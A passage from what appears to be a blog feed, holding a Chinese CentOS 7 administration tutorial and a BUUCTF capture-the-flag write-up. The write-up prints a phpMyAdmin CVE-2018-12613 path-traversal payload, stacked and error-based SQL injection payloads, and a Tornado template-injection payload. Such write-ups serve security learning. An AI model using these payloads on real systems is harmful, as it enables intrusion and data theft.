CCIE<br>groupadd -g 10000 LINUX 创建组的同时指定组ID</p><p><b>删除用户组</b><br>groupdel CCIE</p><p><b>查看用户信息</b><br>id + username</p><p><b>用户信息文件</b><br>/etc/passwd 和 /etc/shadow</p><p><img src="https://tva2.sinaimg.cn/large/006IjVYfgy1fydczrvejfj30hg092td5.jpg" class="lazyload" data-srcset="https://tva2.sinaimg.cn/large/006IjVYfgy1fydczrvejfj30hg092td5.jpg" srcset="/css/images/overlay.gif" alt=""></p><p>其格式：$id$salt$encrypted</p><p>1MD5</p><p>2aBlowfish(not in mainline glibc;added in some Linux distribution)</p><p>5SHA-256(since glibc 2.7)</p><p>6SHA-512(since glibc 2.7)</p><p>修改日期：这个是表明上一次修改密码的日期与1970-1-1相距的天数密码不可改的天数：假如这个数字是8，则8天内不可改密码，如果是0，则随时可以改。<br>密码需要修改的期限：如果是99999则永远不用改。如果是其其他数字比如12345，那么必须在距离1970-1-1的12345天内修改密码，否则密码失效。<br>修改期限前N天发出警告：比如你在第五条规定今年6月20号规定密码必须被修改，系统会从距离6-20号的N天前向对应的用户发出警告。<br>密码过期的宽限：假设这个数字被设定为M，那么帐号过期的M天内修改密码是可以修改的，改了之后账户可以继续使用。<br>帐号失效日期：假设这个日期为X，与第三条一样，X表示的日期依然是1970-1-1相距的天数，过了X之后，帐号失效。<br>保留：被保留项，暂时还没有被用上。</p><p><b>用户组信息文件</b><br>/etc/group</p><p><b>切换用户</b></p><p>su -username<br>退出用户/注销：exit</p><h4><font color="blue">权限</font><br></h4><p><b>文件权限</b><br>ls -l (等于ll)</p><p><img src="https://tva2.sinaimg.cn/large/006IjVYfgy1fydd7un284j30tk0fgwkj.jpg" class="lazyload" data-srcset="https://tva2.sinaimg.cn/large/006IjVYfgy1fydd7un284j30tk0fgwkj.jpg" srcset="/css/images/overlay.gif" alt=""><br>前部分显示的即为文件权限：</p><p><img src="https://tva2.sinaimg.cn/large/006IjVYfgy1fydd964r0rj30l40caju3.jpg" class="lazyload" data-srcset="https://tva2.sinaimg.cn/large/006IjVYfgy1fydd964r0rj30l40caju3.jpg" srcset="/css/images/overlay.gif" alt=""></p><p>d:目录类型的文件<br>-:普通文件<br>l:连接文件<br>b:块文件</p><p>r:读，数学值为4<br>w:写，数学值为2<br>x:执行，数学值为1，针对目录，x是表示是否可进入</p><p>rwx rwx rwx<br>usergroupother</p><p><b>修改文件权限</b></p><p><code># chmod u-w /root/Desktop/file-1</code><br><code># chmod u+w /root/Desktop/file-1</code><br><code># chmod g-x /root/Desktop/file-1</code><br><code># chmod o-x /root/Desktop/file-1</code></p><p><code># chmod 577 /root/Desktop/file-1</code><br><code># chmod 767 /root/Desktop/file-1</code><br><code># cmmod 776 /root/Desktop/file-1</code></p><p><b>修改文件所有者/所属组</b></p><p><code># chown student file-1</code>将文件的所有者修改为student<br><code># chgrp harry file-1</code>将文件的所属组修改为harry<br><code># chown student:harry file-1</code>一次性同时修改文件所有者和所属组</p><p><b>umask值</b><br>创建一个文件时，文件的默认权限是由创建它们的进程设置。如，root用户通过touch创建的文件的权限为644，普通用户通过touch创建的文件的权限为664，root用户和普通用户创建的目录的权限为755。这些默认权限是由umask值控制。</p><p>获取当前环境用户的umask值：<br><code># umask</code><br>所有普通用户umask值的设置<br><code># vim /etc/profile</code><br><code># vim /etc/bashrc</code></p><p><b>特殊权限</b><br>1.suid(set uid)<br>(1)含义<br>只对文件有效，对目录无效。文件设置了suid后，其他用户执行该文件时，是以文件owner的身份来执行该文件。</p><p>(2)示例<br>Linux系统中一切皆文件，调用touch命令执行创建文件操作时，是调用touch这个可执行文件来创建文件。<br><code># which touch</code><br>/usr/bin/touch<br><code># ll /usr/bin/touch</code><br>-rwxr-xr-x. 1 root root 62432 Nov 20  2015 /usr/bin/touch</p><p>针对/usr/bin/touch这个可执行文件，所有者所属组和其他用户均有执行权限，即任何可登录系统的用户均可调用touch命令创建文件，且默认情况下“谁创建谁拥有”<br><code># su - harry</code><br><code>$ touch file-1</code><br><code>$ ll</code><br>-rw-rw-r--. 1 harry harry  0 Nov 26 10:01 file-1</p><p>设置/usr/bin/touch这个可执行文件的suid位<br><code># chmod u+s /usr/bin/touch</code><br><code># ll /usr/bin/touch</code><br>-rwsr-xr-x. 1 root root 62432 Nov 20  2015 /usr/bin/touch</p><p>/usr/bin/touch被设置了suid位后，harry用户再次调用touch创建文件<br><code># su - harry</code><br><code>$ touch file-2</code><br><code>$ ll</code><br>-rw-rw-r--. 1 harry harry 0 Nov 26 10:01 file-1<br>-rw-rw-r--. 1 root  harry 0 Nov 26 10:05 file-2</p><p>(3)设置suid位<br><code># chmod u+s filename</code><br><code># chmod 4755 filename</code></p><p>(4)应用场景<br>系统中任何用户都允许调用passwd命令修改自己的密码，修改密码时需要修改/etc/passwd /etc/shadow两个文件，但这两个文件的权限不允许普通用户修改，因此针对passwd这个可执行文件设置了suid<br><code># ll /etc/passwd /etc/shadow</code><br>-rw-r--r--. 1 root root 2538 Nov 25 11:35 /etc/passwd<br>----------. 1 root root 1716 Nov 25 13:45 /etc/shadow<br><code># which passwd</code><br>/usr/bin/passwd<br><code># ll /usr/bin/passwd</code><br>-rwsr-xr-x. 1 root root 27832 Jun 10  2014 /usr/bin/passwd</p><p>(5)总结<br>从系统安全角度出发，对于有些文件只允许管理员进行修改，但普通用于又需要通过某些进程命令访问修改，此时可以设置这些文件针对普通用户没有w和x权限，同时设置访问文件的进程命令的suid</p><p>2.sgid(set gid)<br>(1)含义<br>针对文件：文件设置了sgid后，其他用户执行该文件时，是以文件group的身份来执行该文件。<br>针对目录：目录设置了sgid后，用户在目录中新建的文件所属组将被自动设置为该目录的组。</p><p>(2)示例一，针对文件，以/usr/bin/touch这个可执行文件为例<br>未设置sgid之前，/usr/bin/touch这个可执行文件的权限状态<br><code># ll /usr/bin/touch</code><br>-rwxr-xr-x. 1 root root 62432 Nov 20  2015 /usr/bin/touch</p><p>切换到harry用户创建file-1，其所有者为harry，所属组为harry<br><code># su - harry</code><br><code>$ touch file-1</code><br><code>$ ll</code><br>-rw-rw-r--. 1 harry harry 0 Nov 26 11:02 file-1</p><p>以root用户设置/usr/bin/touch的sgid位<br><code># chmod g+s /usr/bin/touch</code><br><code># ll /usr/bin/touch</code><br>-rwxr-sr-x. 1 root root 62432 Nov 20  2015 /usr/bin/touch</p><p>以harry用户再创建一个文件file-2，file-2文件被创建时是以root组身份创建，因此file-2的所属组为root<br><code># su - harry</code><br><code>$ touch file-2</code><br><code>$ ll</code><br>-rw-rw-r--. 1 harry harry 0 Nov 26 11:02 file-1<br>-rw-rw-r--. 1 harry root  0 Nov 26 11:02 file-2</p><p>(3)示例二，针对目录<br>root用户创建一个共享目录，并修改权限使得普通用户具有写权限<br><code># mkdir /public</code><br><code># ll -d /public</code><br>drwxr-xr-x. 2 root root 6 Nov 26 11:11 /public<br><code># chmod 777 /public</code><br><code># ll -d /public</code><br>drwxrwxrwx. 2 root root 6 Nov 26 11:11 /public</p><p>未设置sgid情况下，harry用户创建的目录，其所有者和所属组均为harry<br><code># su - harry</code><br><code>$ mkdir /public/dir-harry-1</code><br><code>$ ll -d /public/dir-harry-1/</code><br>drwxrwxr-x. 2 harry harry 6 Nov 26 11:13 /public/dir-harry-1/</p><p>使用root用户设置/public的sgid位<br><code># chmod g+s /public</code><br><code># ll -d /public</code><br>drwxrwsrwx. 4 root root 42 Nov 26 11:15 /public</p><p>设置了sgid后，再使用harry用户创建目录，其所有者依然为harry，但所属组与/public所属组一致<br><code># su - harry</code><br><code>$ mkdir /public/dir-harry-2</code><br><code>$ ll /public</code><br>drwxrwxr-x. 2 harry harry 6 Nov 26 11:13 dir-harry-1<br>drwxrwsr-x. 2 harry root  6 Nov 26 11:15 dir-harry-2</p><p>(4)设置sgid位<br><code># chmod g+s filename</code><br><code># chmod 2755 filename</code></p><p>3.sticky<br>(1)含义<br>只对目录有效，对文件无效。目录设置了sticky后，对目录有写权限的用户只能删除其所拥有的文件，无法删除其他用户所拥有的文件，root用户除外。</p><p>(2)示例<br>未设置sticky时，权限足够的情况下，harry用户可删除root用户的文件<br><code># ll -d /public</code><br>drwxrwxrwx. 2 root root 6 Nov 26 11:43 /public<br><code># touch /public/file-root</code></p><p><code># su - harry</code><br><code>$ rm -rf /public/file-root</code></p><p>设置sticky时，权限足够的情况下，harry用户无法删除root用户的文件<br><code># chmod o+t /public/</code><br><code># ll -d /public/</code><br>drwxrwxrwt. 2 root root 6 Nov 26 11:44 /public/<br><code># touch /public/file-root</code></p><p><code># su - harry</code><br><code>$ rm -rf /public/file-root</code><br>rm: cannot remove ‘/public/file-root’: Operation not permitted</p><p>4.设置suid sgid sticky后，代表文件权限的9位字符的变化<br>suid：显示在文件user的x位，若文件user有x权限，则显示s；若没有x权限，则显示S<br>sgid：显示在文件group的x位，若文件group有x权限，则显示s；若没有x权限，则显示S<br>sticky：显示在文件other的x位，若文件other有x权限，则显示t；若没有x权限，则显示T</p><p><b>ACL权限</b><br>1.获取文件或目录的ACL信息<br><code># ll /public/file-root</code><br>-rw-r--r--. 1 root root 0 Nov 26 11:44 /public/file-root<br><code># getfacl /public/file-root</code><br>getfacl: Removing leading '/' from absolute path names<br># file: public/file-root<br># owner: root<br># group: root<br>user::rw-<br>group::r--<br>other::r--</p><p>2.设置ACL<br>针对file-root文件，other用户没有写权限，设置harry这个other类的用户可读可写可执行<br><code># setfacl -m u:harry:rwx /public/file-root</code><br><code># ll /public/file-root</code><br>-rw-rwxr--+ 1 root root 0 Nov 26 12:21 /public/file-root<br><code># getfacl /public/file-root</code><br>getfacl: Removing leading '/' from absolute path names<br># file: public/file-root<br># owner: root<br># group: root<br>user::rw-<br>user:harry:rwx<br>group::r--<br>mask::rwx<br>other::r--</p><p>3.ACL中的mask值<br>(1)mask值限制了ACL中的用户或组的最大权限<br>(2)默认情况下，mask值跟随ACL条目中最大的权限，确保相应的权限设置能被顺利实现（重新计算mask）<br>(3)每次设置一个新ACL条目时，如果当前mask所表示的权限小于新条目的设置权限，则mask跟随新条目的权限，反之则保持不变<br>(4)在设置ACL条目时，可加上-n参数让mask值不随新条目的权限增长变化</p><p>4.默认ACL，目录可这只默认ACL，这些ACL将由所有子文件自动继承<br><code># setfacl -m d:u:harry:rwx dir-1</code></p><p>5.删除ACL<br>-x, --remove=acl        remove entries from the ACL(s) of file(s)<br>-b, --remove-all        remove all extended ACL entries<br>-k, --remove-default    remove the default ACL</p><h3><b>0x04- - Vim 使用<b></b></b></h3><p><code># vim /root/Desktop/file-1</code><br>(1)阅读模式:只能阅读<br>(2)阅读模式进入编辑模式:<br>i(当前光标所在处插入)<br>a(当前光标所在处后一个字符插入)<br>o(当前光标所在行的下一行插入)<br>O(当前光标所在行的上一行插入)<br>(3)从编辑模式退出到阅读模式:Esc键<br>(4)撤销:在阅读模式下按u键<br>(5)复制粘贴:阅读模式下，光标移动到需要复制的行，yy复制，p粘贴。复制光标所在行往下2行（包含光标所在行），2y，p<br>(6)删除单个字符:阅读模式下，x键往后删一个字符，X键往前删一个字符<br>(7)删除光标位置到行尾内容，D键<br>(8)剪切整行，dd剪切光标所在行，p粘贴<br>(9)删除整行，dd剪切完了不粘贴<br>(10)删除可知的数行，数字加dd，如：2dd，删除光标所在行及其下一行<br>(11)删除未知的数行，通常加一个超大的数字如，10000dd<br>(12)临时为文件加上行号，阅读模式下，:set nu，取消行号:set nonu<br>(13)可以为vim编辑器设置永久行号，vim ~/.vimrc 写入set nu<br>(14)设置tab，vim ~/.vimrc 写入set ts=2<br>(15)跳转到行首行尾，阅读模式下，直接到行尾，G键，直接到行首，gg键<br>(16)具体跳转到某行，阅读模式下，行号加G，或者，:行号<br>(17)行选中，阅读模式下，v键，配合方向键调整<br>(18)矩形选中，阅读模式下，Ctrl + v,配合方向键调整选中<br>(19)替换某个字符，阅读模式下，调整光标到需要替换的位置，按r键，然后输入需要替换的字符<br>(20)查找,阅读模式下，/被查找的内容,所有符合查找内容的均被高亮显示，n键将光标转移至下一个匹配项，N键将光标转移至上一个匹配项<br>(21)查找替换,阅读模式下，:%s/被替换的内容/替换为的内容，注意默认只替换每一行第一个被匹配的内容，如需全文替换则%s/被替换的内容/替换为的内容/g<br>(22)保存，退出<br>:q,不保存修改而退出<br>:q!,不保存修改而强制退出<br>:w,保存不退出<br>:wq,保存退出<br>:wq!，保存强制退出<br>:x,执行，在vim中就是保存退出</p><h3><b>0x05- - 网络配置<b></b></b></h3><p>(1)ifconfig或者ifconfig -a命令用来查看硬件接口信息</p><p>(2)每一个网络接口的配置信息是以单独文件形式存在，存放在/etc/sysconfig/network-scripts/</p><p>(3)<code>#vim ifcfg-eno16777736</code></p><blockquote><p>TYPE=Ethernet网络类型<br>BOOTPROTO=dhcp获取IP的方式 dhcp/none/static<br>NAME=eno16777736设备别名<br>DEVICE=eno16777736设备名称<br>UUID=2cb9c49c-e534-49a5-ab2b-3d9fb2d36a77系统中该设备的唯一编号<br>ONBOOT=no开机启动/随服务启动</p></blockquote><p>(4)手工配置网络<br><code># systemctl stop NetworkManager</code>  关闭NM工具<br><code># systemctl disable NetworkManager</code>让NM工具重启不启动<br><code>#systemctl status network</code>  检查一下提供网络服务的进程是否running<br><code># vim /etc/sysconfig/network-scripts/ifcfg-eno16777736</code></p><blockquote><p>TYPE=Ethernet<br>BOOTPROTO=static<br>NAME=eno16777736<br>UUID=2cb9c49c-e534-49a5-ab2b-3d9fb2d36a77<br>DEVICE=eno16777736<br>ONBOOT=yes<br>IPADDR=192.168.1.100<br>NETMASK=255.255.255.0<br>PREFIX=24<br>GATEWAY=192.168.1.1</p></blockquote><p><code># vim /etc/resolv.conf</code>配置DNS<br><code># nameserver 192.168.1.1</code></p><p><code># systemctl restart network</code>重新启动网络服务<br><code># ifdown eno16777736</code>关闭接口<br><code># ifup eno16777736</code>开启接口</p><p>(5)通过NetworkManager工具来管理网络<br><code># systemctl enable NetworkManager</code><br><code># systemctl start NetworkManager</code><br><code># nmcli connection show</code>查看当前网络连接<br><code># nmcli connection add con-name port0 ifname eno16777736 autoconnect yes type ethernet save yes</code><br><code># nmcli connection modify port0 ipv4.method auto</code>配置IP地址的获取方式为dhcp<br><code># nmcli connection up port0</code><br><code># nmcli connection modify port0 ipv4.addresses 192.168.1.200/24 ipv4.gateway 192.168.1.1 ipv4.dns 192.168.1.1 ipv4.method manual</code> 配置IP地址的获取方式为静态IP<br><code># nmcli connection up port0</code></p><p>(6)更改网卡名称:<br><code>$ vim /etc/sysconfig/network-scripts/ifcfg-****</code><br>将 NAME 值设置为 eth0<br>将 DEVICE 值设置为 eth0<br>保存退出，并重命名该文件为ifcfg-eth0<br><code># mv /etc/sysconfig/network-scripts/ifcfg-**** ifcfg-eth0</code><br>修改可预测命名规则:<br><code># vim /etc/default/grub</code><br>在GRUB_CMDLINE_LINUX 内添加内核参数&quot;net.ifnames=0 biosdevname=0&quot;<br>重新生成GRUB配置并更新内核参数<br><code># grub2-mkconfig -o /boot/grub2/grub.cfg</code><br>重启即可<br><code># reboot</code></p><h3><b>0x06- - 环境变量<b></b></b></h3><p>1.定义<br>一般是指在操作系统中用来指定操作系统运行环境的一些参数，如系统使用哪种shell，显示色彩，使用的语言和字符集等。</p><p>2.环境变量分类<br>(1).当前用户的环境变量（人的身高、体重、血压）<br>(2).当前用户使用的shell的变量（锻炼使用的跑步机可调节的速度范围和坡度范围）<br>(3).导出成用户变量的shell变量（一定时间内人跑步会使用固定的坡度和速度）</p><p>3.输出所有环境变量<br>env：显示当前用户的环境变量<br>set：显示当前shell的变量，包括当前用户的变量<br>export：显示当前导出成用户变量的shell变量。<br>每个shell有自己特有的变量（set）显示的变量，和用户变量是不同的，当前用户变量和使用什么shell无关，无论使用什么shell都在，比如HOME,SHELL等这些变量，但shell自己的变量不同shell是不同的，比如BASH_VERSION，这些变量只有set才会显示，是bash特有的，export不加参数的时候，显示哪些变量被导出成了用户变量，因为一个shell自己的变量可以通过export “导出”变成一个用户变量。</p><p>4.常用环境变量<br>PATH：命令查找路径echo $PATH<br>USER：当前登录用户echo $USER<br>HOSTNAME：系统hostnameecho $HOSTNAME<br>HISTSIZE：历史命令保留数值echo $HISTSIZE</p><p>5.存放环境变量的文件<br>(1)/etc/profile：用户登录Linux系统或使用su -命令切换到另一个用户时，该文件为用户设置环境信息,该文件被执行，并从/etc/profile.d目录的配置文件中搜集shell的设置<br>(2)/etc/profile.d：目录中存放的是一些脚本，其中包括了颜色、语言、less、vim及which等命令的一些附加设置。这些脚本文件之所以能够被自动执行，是因为在/etc/profile 中使用一个for循环语句来调用这些脚本。而这些脚本文件是用来设置一些变量和运行一些初始化过程的。<br>(3)/etc/bashrc：为每一个运行bash shell的用户执行此文件，当bash shell被打开时,该文件被读取<br>验证：<br>vim /etc/bashrc<br>echo &quot;hello&quot; &gt;&gt; /tmp/file.txt<br>每打开一个shell窗口，就会执行一次/etc/bashrc文件</p><p>(4)~/.bash_profile：每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次，默认情况下,他设置一些环境变量,执行用户的.bashrc文件。</p><p>(5)~/.bashrc：该文件存储的是专属于个人bash shell的信息，当登录时以及每次打开一个新的shell时，执行这个文件。在这个文件里可以自定义用户专属的个人信息。</p><h3><b>0x07- - 软件包的安装<b></b></b></h3><p>因使用的是centos，这里软件包管理软件使用rpm以及yum</p><p>一、rpm包<br>1.安装rpm -ivh vsftpd-3.0.2-10.el7.x86_64.rpm<br>2.查询系统中所有已安装的rpm包rpm -qa<br>3.查询某个rpm包有没有安装rpm -qa |grep vsftpd<br>4.查询某个已安装软件包包含哪些文件rpm -ql vsftpd<br>5.删除某个软件包rpm -e vsftpd<br>6.软件包升级rpm -Uvh vsftpd-3.2.2-10.el7.x86_64.rpm<br>注意点：在升级内核的时候<br>补充：内核版本查看uname -r。不同版本的内核在系统中可以共存，并且正常情况下，都可以用来启动，在做 内核升级的时候，基本上是采用rpm -ivh kernel-3.20.0-327.el7.x86_64.rpm，其原因主要是rpm -Uvh相当于安装新内核删除旧内核，而rpm -ivh是纯粹安装新内核，如此如果新内核有问题，还能够从旧内核启动</p><p>二、源码包<br>1.压缩型源码包，xxx.tar.gz，xxx.tar.bz2，xxx.tar.xz<br>（1）解压: tar -x[alpha]vf xxx.tar.[alpha]z<br>gz: [alpha] = z<br>bz2：[alpha] = j<br>xz：[alpha] = J<br>压缩/解压缩考验的是CPU和硬盘的性能</p><p>（2）配置安装环境<br>tar -x[alpha]vf xxx.tar.[alpha]z解压之后在压缩包所在的目录下生成一个同名的文件夹，需要进入到该文件夹中进行配置安装环境，一般情况下该文件夹下有一个configure的脚本，执行该脚本 ./configure，常用默认安装路径（/usr/bin，/usr/sbin，/usr/local/bin，/usr/local/sbin）配置也有参数，常用的参数--prefix=/opt，表示未来将/opt目录作为安装路径，其他参数参见configure文件</p><p>（3）编译（源码编译生成可执行文件）<br>make，可选参数为-j，-j表示采用多核进编译，例如make -j 8，采用8个核同时进行编译，加快速度。编译考量的是CPU性能</p><p>（4）安装（将软件所需的各种文件及权限放入该放入的地方）<br>make install，考量的是磁盘性能</p><p>2.rpm型源码包，命令xxx.src.rpm<br>1.有没有依赖性？大部分情况不具有依赖性<br>2.安装 rpm -ivh xxx.src.rpm，其实这里的rpm -ivh 与真正的rpm包的rpm -ivh含义可能不同，这里rpm -ivh更接近“解压”的含义<br>3.安装完成后一定会生成2个文件，一个是xxx.tar.[alpha]z，另一个是xxx.spec<br>4.利用rpmbuild工具根据xxx.spec文件对xxx.tar.[alpha]z进行编译，最终会生成xxx.rpm极其依赖包<br>5.利用rpm -ivh命令对最终生成的rpm包进行安装</p><p>针对1、2这两种类型的源码包，删除是比较麻烦的</p><p>三、yum<br>yum全称是Yellow Package Manager，是针对rpm包的依赖缺点，用来解决包依赖关系的工具，要使用yum需做如下事情：<br>1.要提供软件包来源。（本地（ISO镜像文件），来自于局域网/互联网上的yum源）<br>2.告知yum包管理器，软件包来源的位置。这点主要是通过配置文件编写的形式实现</p><p>如下选择来自互联网的源，则：<br>1.必须能联网<br>2.上述第二点就无需设置，其原因主要是系统安装完成后，已经生成相应的配置文件，路径是/etc/yum.repos.d，该目录下有诸多以.repo结尾的文件，就是指向互联网yum源的配置文件</p><p>（1）列出yum源的可用软件包：yum list available<br>（2）清除yum包管理器的缓存：yum clean all<br>（3）查询现有的yum源上是否有某款软件：yum search gcc<br>（4）安装gcc：yum install gcc [-y]，-y参数表示自动应答yum的提问，yum的方式安装软件时会自动解析软件所依赖的包，并一并装上这些依赖包<br>（5）删除：yum remove gcc [-y]，yum也会解析被卸载的包的依赖关系，在正确处理依赖关系后，yum只会删除需要卸载的软件包，而不会删除曾经安装它时那些因依赖而装上的软件包<br>（6）下载docker软件及其依赖软件：yumdownloader docker --resolve --destdir=/root/Desktop/packages<br>制作“索引”的过程 createrepo /root/Desktop/packages<br>编辑配置文件告知yum包管理器软件仓库的位置 vim /etc/yum.repos.d/docker.repo<br>[docker]<br>name=docker for Centos7<br>baseurl=file:///root/Desktop/packages<br>enabled=1<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<br>（7）将ISO镜像文件作为本地yum源</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Linux--CentOS7.0&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;目录:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;0x00 前言&lt;/li&gt;
&lt;li&gt;0x01 Linux简介&lt;/li&gt;
&lt;li&gt;0x02 Linux简单命令&lt;/li&gt;
&lt;li&gt;0x03 用户和权限管理&lt;/li&gt;
&lt;li&gt;0x04</summary>
      
    
    
    
    <category term="Operation" scheme="http://blog.dvkunion.cn/categories/Operation/"/>
    
    
    <category term="Linux" scheme="http://blog.dvkunion.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF</title>
    <link href="http://blog.dvkunion.cn/2019/10/07/BUUCTF/"/>
    <id>http://blog.dvkunion.cn/2019/10/07/BUUCTF/</id>
    <published>2019-10-07T15:13:00.000Z</published>
    <updated>2022-01-05T05:43:55.899Z</updated>
    
    <content type="html"><![CDATA[<h1>BUUCTF</h1><center><small>2019-10-07</small></center>一天一道CTF，满脸写着高兴，浑身都是干劲。<center><small>华丽的分割线</small></center><hr><h3><b>0x01- - WEB</b></h3><p><b>01-[HCTF 2018]WarmUp</b></p><p>第一题是一个代码审计，考一个cve，phpMyAdmin 4.8.0和4.8.1的文件包含，编号CVE-2018-12613。<br>这题在国赛线下赛的时候也做过，当时直接查到了原题。。。作为复现重新理一遍。</p><p>首先打开会发现一个滑稽，然后F12大法发现了source.php，得到了源码，发现还存在一个hint.php。<br>hint.php告诉了我们flag所存在的文件名。</p><p>然后我们把重点放到source.php身上：</p><p><img src="https://cdn.dvkunion.cn//myblog/BUUCTFWX20191007-233153@2x.png" class="lazyload" data-srcset="https://cdn.dvkunion.cn//myblog/BUUCTFWX20191007-233153@2x.png" srcset="/css/images/overlay.gif" alt=""></p><p>首先是一个class类，提供了一共公共的方法checkfile。要求我们输入一个file参数，这个file参数要是字符串(is_string)并且满足checkfile函数才能被include加载，也就是说我们需要构造一个满足checkfile的payload使其加载hint.php内提到的ffffllllaaaagggg文件。<br>分析checkfile函数：首先定义了一个白名单，将source和hint作为白名单参数。然后进行了第一次if判断：要求满足非空且为字符串。</p><p>之后就是关键的部分了：分别进行了三次判断，判断我们传入的file参数是否满足白名单。</p><pre class=" language-language-php"><code class="language-language-php">if (in_array($page, $whitelist)) &#123    return true;&#125</code></pre><p>第一次判断和第二次判断之间进行了一次mb_substr操作，mb_substr将page参数按照'?'进行了截断，mb_strpos可以返回查找到的第一个?的位置。</p><pre class=" language-language-php"><code class="language-language-php">$_page = mb_substr(                $page,                0,                mb_strpos($page . '?', '?')            );</code></pre><p>第二次和第三次之间还进行了一次url解码：</p><pre class=" language-language-php"><code class="language-language-php">$_page = urldecode($page);$_page = mb_substr(                $page,                0,                mb_strpos($page . '?', '?')            );</code></pre><p>那么整体的逻辑就出来了，就是对file参数进行校验，三次判断中如果有一次满足条件即可。可以通过二次url编码使得?绕过检测从而截断文件名使得checkfile函数返回true通过判断，最后通过include加载source.php?../../../文件，经过双重编码的参数会被当作一个路径进行加载，导致目录穿越读取到了文件。<br>最终payload:file=source.php%253f/../../../../../ffffllllaaaagggg 但是题目好像直接用?不需要二次编码也能读到?不知道为啥。</p><p><b>02-[强网杯 2019]随便注1</b></p><p>提示是注入题目，简单测试以后发现有一个正则过滤：</p><p><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p><p>虽然可以使用and、or，但是过滤了select。。。被卡在这里。</p><p>然后学到了新的东西：堆注。(搞这么久我居然都没用过堆注。。。)</p><p>堆注用的主要是没有过滤';'和show等关键字。在sql中，';'表示一个语句的结束，当我们在参数内引入;来结束原sql语句并在后方构造想要自己执行的sql语句，就构成了堆叠注入。</p><p>那么很明显了。。这道题没有过滤‘;'，我们构造payload:inject=1';show databases;#可以看到所有的数据库。</p><p>show columns from 表名 可以看字段，但是对于纯数字的表明要加反引号：</p><p>查到了列之后就要搞存储的数据。。。但是select被禁了。这里发现了两个大佬的思路：</p><p>1.将纯数字的表替换成words表，这样能够在前端把所有数据炸出来。(alter、rename)</p><p>payload1:/?inject=1';ALTER TABLE <code>1919810931114514</code> ADD <code>id</code> INT(1) NOT NULL DEFAULT '1' AFTER <code>flag</code>;%23';alter+table+<code>1919810931114514</code>+rename+to+<code>xxx</code>;alter+table+<code>words</code>+rename+to+<code>zzz</code>;alter+table+<code>xxx</code>+rename+to+<code>words</code></p><p>payload2:/?inject=1';RENAME TABLE <code>words</code> TO <code>words1</code>;RENAME TABLE <code>1919810931114514</code> TO <code>words</code>;ALTER TABLE <code>words</code> CHANGE <code>flag</code> <code>id</code> VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</p><p>2.编码加密绕过(prepare、execute、十六进制绕过、动态拼接)</p><p>payload1:/?inject=1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare%20execsql%20from%20@a;execute%20execsql;#</p><p>payload2:';use information_schema;set @sql=concat('s','elect column_name from columns wher','e table_name=&quot;1919810931114514&quot;');PREPARE stmt1 FROM @sql;EXECUTE stmt1;--+</p><p>附加一点。报错注入：inject=-1%27%20and%20extractvalue(1,concat(1,version()))--+</p><p><b>03-easy_tornado</b></p><p>观察一圈，给了三个txt，第一个告诉你flag位置，第二个welcome,提示渲染函数render，第三个提示hash算法，如果能够拿到cookie_secret就可以结合文件名算出md5，再尝试目录穿越读取flag文件。</p><p>毫无思路，去找大佬。然后学习到了新的：模版注入（SSIT、服务器模版注入）。</p><p>题目叫做tornado。是python的web框架，大佬说可以使用模版注入，通过报错把cookie炸出来。<br>发现报错页面使用的msg参数是一个模版参数<code>msg=&amp;#123&amp;#123&amp;#125&amp;#125</code>会把传入的参数显示出来。</p><p>然后构造payload:<code>msg=&amp;#123&amp;#123headler.settings&amp;#125&amp;#125</code>炸出cookie，直接算出md5即可。。。</p><p>那么这里面一共有几个知识点，渲染函数render、tornado的setting函数、模版注入攻击(SSIT)。</p><p><b>04-[强网杯 2019]高明的黑客</b></p><p>题目直接给了源码。下载源码是一堆混淆了的php文件。。。想起来噩梦的 那题，又放弃了<br>继续根据wp学习吧。<br>然后看了wp后，不得不佩服大佬们细心、耐心、扎实的基础、以及稀奇古怪、骚的不行的姿势。<u>大佬:基本操作，坐下！</u><br>总之就是，大佬 永远知道自己在干什么，出题人想干什么；而我不知道出题人想干啥，也不知道自己要干啥。</p><p>首先看到这么多文件，都是被混淆了，但是并没有完全的混淆，仔细的观察能够发现存在着get、post等方法，那么直接去fuzz所有的文件并尝试寻找一句话。。。</p><p>行吧，纯当练习py脚本了。</p><p><b>04-admin</b></p><p>贴上大佬的博客。。。tql。。。<a href="https://www.anquanke.com/post/id/164086#h2-10" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164086#h2-10</a></p><p>打开是一个欢迎界面，有登陆和注册功能。fuzz发现登陆处单引号报错。<br>尝试万能密码登陆，失败。</p><p>返回进行注册。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;BUUCTF&lt;/h1&gt;
&lt;center&gt;&lt;small&gt;2019-10-07&lt;/small&gt;&lt;/center&gt;
一天一道CTF，满脸写着高兴，浑身都是干劲。
&lt;center&gt;&lt;small&gt;华丽的分割线&lt;/small&gt;&lt;/center&gt;
&lt;hr&gt;
&lt;h3&gt;&lt;b&gt;0x01- -</summary>
      
    
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/tags/CTF/"/>
    
    <category term="WP" scheme="http://blog.dvkunion.cn/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>python核心编程</title>
    <link href="http://blog.dvkunion.cn/2019/10/02/python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/"/>
    <id>http://blog.dvkunion.cn/2019/10/02/python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/</id>
    <published>2019-10-01T16:59:40.000Z</published>
    <updated>2022-01-05T05:43:55.941Z</updated>
    
